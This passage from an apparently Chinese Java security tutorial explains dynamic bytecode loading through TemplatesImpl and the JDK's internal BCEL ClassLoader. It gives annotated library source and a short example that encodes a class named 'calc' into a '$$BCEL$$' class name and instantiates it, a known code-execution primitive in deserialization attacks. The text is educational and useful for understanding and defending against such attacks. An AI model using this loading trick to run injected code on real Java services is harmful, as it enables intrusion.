class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">// 在这里编写代码</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外对于高版本的 JDK，<code>TransletClassLoader</code> 的创建需要用到 <code>_tfactory</code>，因此需要将 <code>_tfactory</code> 设置为一个 <code>TransformerFactoryImpl</code> 实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

<h3 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h3><p>BCEL 的全名应该是 Apache Commons BCEL，属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 Java XML功能的 JAXP 规范的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p>
<p>BCEL 库提供了一系列用于分析、创建、修改 Java Class 文件的 API。相较 Commons Collections，BCEL 被包含在原生 JDK 中，更容易被利用。</p>
<blockquote>
<p>BCEL ClassLoader 在 JDK 8u251 版本被删除了（具体来说是 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 这个类不在了），具体时间线为：</p>
<ol>
<li>2007 年 8 月份，<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-110" >BCEL-110<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这个 issue 指出：在尝试运行带有 JAXB 代码的程序时，如果使用了 BCEL 类加载器，会抛出异常。</li>
<li>2015 年 7 月份，<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-222" >BCEL-222<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 发布了 BCEL 6.0 版本。</li>
<li>2015 年 8 月份，<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-110" >BCEL-110<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这个 issue 的讨论中认为 BCEL 类加载器设计标准，且有替代方案。并且如果使用 BCEL 类加载器，JAXB 会出现问题。因此决定在 BCEL 6.0 版本中删除这个类，即删除 <code>commons/proper/bcel/trunk/src/main/java/org/apache/commons/bcel6/util/ClassLoader.java</code> 文件。</li>
<li>2016 年 6 月份，<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-222" >BCEL-222<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 讨论认为，BCEL 6.0 版本无法向后兼容，因此撤销了该更改。因此在 Apache Commons BCEL 中，被删除的 BCEL ClassLoader 又被回滚回来了。</li>
<li>2016 年 8 月份，<a class="link"   target="_blank" rel="noopener" href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8163121" >JDK-8163121<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这个 issue 指出，BCEL 6.0 已于 7 月 16 日在 Apache Commons 发布，并修复了与旧版本相关的多个问题。因此应当将 JDK 中内置的 BCEL 从 5.2 版本升级到 6.0 版本。2020 年在 JDK 8u251 正式修改，BCEL ClassLoader  被删除。</li>
</ol>
<p>根据上述时间线，我们推断可能 Java 团队注意到 BCEL 的 Issue（<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-110" >BCEL-110<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ），并参考其修复方式，决定删除 <code>ClassLoader</code> 类。</p>
</blockquote>
<p>BCEL ClassLoader 的 <code>loadClass</code> 实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 重写此方法以动态创建你自己的类。</span></span><br><span class="line"><span class="comment"> * 类名包含特殊标记 $$BCEL$$。该标记之前的部分被视为包名。</span></span><br><span class="line"><span class="comment"> * 你可以将自己的参数编码到后续的字符串中。然而，必须确保不要使用任何非法字符，</span></span><br><span class="line"><span class="comment"> * 即不能出现在 Java 类名中的字符&lt;br&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 默认实现将字符串解释为编码过的压缩 Java 类，使用 Utility.decode() 方法解压解码，</span></span><br><span class="line"><span class="comment"> * 然后解析得到的字节数组，并返回最终的 JavaClass 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> class_name 包含 &quot;$$BCEL$$&quot; 的压缩字节码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="comment">// 查找 &quot;$$BCEL$$&quot; 的位置</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="comment">// 获取实际的类名部分</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解码类名（压缩的字节码）</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析字节数组并生成 JavaClass 对象</span></span><br><span class="line">        clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();  <span class="comment">// 如果解析失败，打印异常堆栈</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  <span class="comment">// 返回 null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 适配类名为传入的类名</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取类常量池中的类信息</span></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass) cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                      Constants.CONSTANT_Class);</span><br><span class="line">    <span class="comment">// 获取类名的 UTF8 常量</span></span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8) cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line">    <span class="comment">// 更新类名</span></span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回最终的 JavaClass 对象</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 动态加载类。根据不同的条件，逐步尝试不同的加载策略。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> class_name 类名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> resolve 是否需要解析该类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 加载的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 如果类未找到，则抛出该异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span> </span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第一种尝试：查询哈希表。 */</span></span><br><span class="line">    <span class="keyword">if</span> ((cl = (Class) classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">/* 第二种尝试：使用系统类加载器加载系统类。你最好不要干扰它们。 */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">                cl = deferTo.loadClass(class_name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 第三种尝试：是否是特殊请求？ */</span></span><br><span class="line">            <span class="keyword">if</span> (class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 使用 createClass 创建类</span></span><br><span class="line">                clazz = createClass(class_name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 第四种尝试：通过 repository 加载类</span></span><br><span class="line">                <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 修改加载的类</span></span><br><span class="line">                    clazz = modifyClass(clazz);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果没有找到类，抛出 ClassNotFoundException</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 获取类的字节码</span></span><br><span class="line">                <span class="type">byte</span>[] bytes = clazz.getBytes();</span><br><span class="line">                <span class="comment">// 使用 defineClass 定义类</span></span><br><span class="line">                cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果没有找到类，使用默认的类加载器</span></span><br><span class="line">                cl = Class.forName(class_name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果需要解析该类，则解析</span></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将类名与类对象缓存到 classes 哈希表中</span></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;  <span class="comment">// 返回加载的类</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从中可以看出 BCEL ClassLoader 加载字节码的过程为：</p>
<ol>
<li><p><strong>查找已加载的类：</strong>首先，系统会通过哈希表 <code>classes</code> 在本地缓存中查找目标类是否已经加载。如果找到了，直接返回已加载的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((cl = (Class) classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果未找到，则继续尝试其他加载方式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>通过系统类加载器加载类：</strong>如果目标类不在缓存中，系统会使用默认的 <strong>系统类加载器</strong> 来加载类。这是 Java 中常见的类加载方式，适用于类在常规类路径中存在的情况。</p>
<p>这部分的代码通过检查类名是否属于被忽略的包（<code>ignored_packages</code>）来决定是否需要使用默认的类加载器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">        cl = deferTo.loadClass(class_name);  <span class="comment">// 使用系统类加载器加载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>处理包含 <code>$$BCEL$$</code> 标记的类名：</strong>如果类名包含特殊标记 <code>$$BCEL$$</code>，这意味着该类的字节码是经过特殊编码或压缩的。系统会调用 <code>createClass</code> 方法来解码并生成该类的字节码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    clazz = createClass(class_name);  <span class="comment">// 使用 createClass 方法加载字节码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createClass</code> 解码该类的字节码的具体过程为：</p>
<ol>
<li><strong>查找 <code>$$BCEL$$</code> 标记：</strong>首先，<code>createClass</code> 方法检查类名中是否包含 <code>$$BCEL$$</code> 标记，并从中提取出实际的类名。<ul>
<li><code>class_name.indexOf(&quot;$$BCEL$$&quot;)</code>：查找 <code>$$BCEL$$</code> 的位置。</li>
<li><code>class_name.substring(index + 8)</code>：从 <code>$$BCEL$$</code> 后面开始获取实际的类名部分。</li>
</ul>
</li>
<li><strong>解码字节码：</strong>接下来，<code>real_name</code>（即去掉 <code>$$BCEL$$</code> 后的部分）被传递给 <code>Utility.decode(real_name, true)</code> 方法解码出真正的字节码。<strong>注意这里第二个参数为 <code>true</code>，这意味着字节码在解码后还要进行 GZIP 解压缩。</strong></li>
<li><strong>解析字节码：</strong>解码后的字节数组 <code>bytes</code> 会被传递给 <strong><code>ClassParser</code></strong> 来解析。<code>ClassParser</code> 是 BCEL 提供的一个工具类，用于解析字节数组并生成 <code>JavaClass</code> 对象。<code>JavaClass</code> 对象包含了类的字节码、常量池、方法、字段等信息。</li>
<li><strong>更新类名：</strong>一旦 <code>JavaClass</code> 对象被成功创建，就需要更新类名。<code>JavaClass</code> 对象包含了一个 <strong>常量池（ConstantPool）</strong>，用于存储类的常量信息。<ul>
<li>在常量池中，有一个表示类名的常量（<code>ConstantClass</code>）。通过 <code>getConstant(clazz.getClassNameIndex(), Constants.CONSTANT_Class)</code> 获取类名常量。</li>
<li>然后，我们通过 <code>ConstantUtf8</code> 获取类名的具体字符串表示，并将其替换为传入的完整类名 <code>class_name.replace(&#39;.&#39;, &#39;/&#39;)</code>（将 <code>.</code> 转换为 <code>/</code>）。</li>
<li><code>name.setBytes(class_name.replace(&#39;.&#39;, &#39;/&#39;));</code>：更新常量池中的类名。</li>
</ul>
</li>
<li><strong>返回解析后的 <code>JavaClass</code> 对象：</strong>最后，返回通过 <code>ClassParser</code> 解析后的 <code>JavaClass</code> 对象，它包含了该类的字节码和其他相关信息。</li>
</ol>
</li>
<li><p><strong>定义类并返回：</strong>找到字节码后，<code>defineClass</code> 方法会被调用来将字节码转化为 <code>Class</code> 对象。这个方法会根据字节数组定义一个新的类，最终将其加载到 JVM 中。如果通过 <code>repository</code> 或其他方式加载的类已经存在，系统将跳过定义过程，直接返回 <code>Class</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = clazz.getBytes();  <span class="comment">// 获取字节码</span></span><br><span class="line">cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);  <span class="comment">// 定义并加载类</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>缓存类：</strong>最后，加载的类被缓存到 <code>classes</code> 哈希表中，以便下次能够快速访问。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classes.put(class_name, cl);  <span class="comment">// 缓存已加载的类</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>根据上述过程我们可以使用如下代码利用 BCEL ClassLoader 动态加载字节码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//  Class&lt;?&gt; aClass = Class.forName(&quot;$$BCEL$$&quot; + code, true, new ClassLoader());</span></span><br><span class="line">        Class&lt;?&gt; aClass = <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">        aClass.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先代码使用 <code>Repository.lookupClass(Evil.class)</code> 来查找 <code>Eval</code> 这个类得到 BCEL 管理 Java 类所用的类型 <code>JavaClass</code>，然后通过 <code>javaClass.getBytes()</code> 获取到对应的字节码。这里 <code>Repository</code> 是 BCEL 提供的类，它用于查找和管理 Java 类，并且能够将类转换为原生字节码。</p>
<p>之后通过 <code>Utility.encode</code> 将类的字节码编码非 BCEL ClassLoader 能够识别的编码形式，该函数定义如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 将字节数组编码为 Java 标识符字符串，即一个仅包含以下字符的字符串：</span></span><br><span class="line"><span class="comment"> * (a, ... z, A, ... Z, 0, ... 9, _, $)。</span></span><br><span class="line"><span class="comment"> * 编码算法本身并不复杂：如果当前字节的 ASCII 值已经是一个有效的 Java 标识符部分，则保持不变。</span></span><br><span class="line"><span class="comment"> * 否则，它会写入转义字符 ($)，后跟：</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;ul&gt;&lt;li&gt;ASCII 值的十六进制字符串，如果该值不在 200 到 247 之间&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;一个未在小写十六进制字符串中使用的 Java 标识符字符，如果该值在 200 到 247 之间&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;此操作会使原始字节数组膨胀大约 40% 到 50%&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes 要转换的字节数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> compress 是否使用 GZIP 压缩以最小化字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(<span class="type">byte</span>[] bytes, <span class="type">boolean</span> compress)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span>(compress) &#123;</span><br><span class="line">        <span class="comment">// 使用 GZIP 压缩字节数组</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span>      <span class="variable">gos</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        gos.write(bytes, <span class="number">0</span>, bytes.length);  <span class="comment">// 将字节数组写入 GZIP 流</span></span><br><span class="line">        gos.close();  <span class="comment">// 关闭 GZIP 输出流</span></span><br><span class="line">        baos.close(); <span class="comment">// 关闭字节数组输出流</span></span><br><span class="line"></span><br><span class="line">        bytes = baos.toByteArray(); <span class="comment">// 获取压缩后的字节数组</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">CharArrayWriter</span> <span class="variable">caw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharArrayWriter</span>();  <span class="comment">// 用于存储字符输出</span></span><br><span class="line">    <span class="type">JavaWriter</span>      <span class="variable">jw</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWriter</span>(caw);   <span class="comment">// JavaWriter 用于将字节写入字符输出流</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">in</span> <span class="operator">=</span> bytes[i] &amp; <span class="number">0x000000ff</span>; <span class="comment">// 将字节转换为无符号值</span></span><br><span class="line">        jw.write(in);  <span class="comment">// 将字节值写入 JavaWriter</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> caw.toString();  <span class="comment">// 返回编码后的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们首先需要将 Java 字节码进行 GZIP 压缩，之后借助 <code>JavaWriter</code> 将字节编码写入 <code>CharArrayWriter</code> 然后再转换成字符串输出。其中 <code>JavaWriter</code> 的 <code>write</code> 方法会对字符进行转义操作：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span>  <span class="variable">ESCAPE_CHAR</span> <span class="operator">=</span> <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 判断该字节是否是有效的 Java 标识符的一部分，并且该字节不是转义字符</span></span><br><span class="line">    <span class="keyword">if</span> (isJavaIdentifierPart((<span class="type">char</span>) b) &amp;&amp; (b != ESCAPE_CHAR)) &#123;</span><br><span class="line">        out.write(b);  <span class="comment">// 直接写入字节</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out.write(ESCAPE_CHAR); <span class="comment">// 写入转义字符</span></span><br><span 